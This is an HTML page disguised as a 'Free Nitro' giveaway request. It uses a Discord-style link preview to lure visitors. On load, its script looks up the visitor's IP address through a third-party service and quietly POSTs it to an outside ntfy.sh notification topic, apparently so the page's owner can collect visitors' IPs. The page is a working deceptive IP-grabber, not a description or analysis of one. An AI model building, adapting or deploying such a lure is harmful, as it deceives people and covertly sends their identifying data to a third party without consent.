<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@300&display=swap" rel="stylesheet">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(to bottom, #ff6ec4, #7873f5);
            font-family: 'Lexend', sans-serif;
        }
        .container {
            text-align: center;
        }
        #ip-address {
            font-size: 24px;
            color: #fff;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
    </style>
    <meta content="Free Nitro Request" property="og:title" />
    <meta content="if you give me a good enough reason to give you nitro, i will" property="og:description" />
    <meta content="#ff6ec4" data-react-helmet="true" name="theme-color" />
    <title>Free Nitro! (Real 2024)</title>
</head>
<body>
    <div class="container">
        <p id="ip-address">Your IP address is <span id="ip"></span></p>
    </div>
    <script>
        // Get user's IP address using a third-party service
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById('ip').innerText = data.ip;
                fetch('https://ntfy.sh/disenhancedrock', {
                    method: 'POST', // PUT works too
                    body: data.ip
                })
          })
         .catch(error => console.error('Error fetching IP address:', error));
    </script>
</body>
</html>
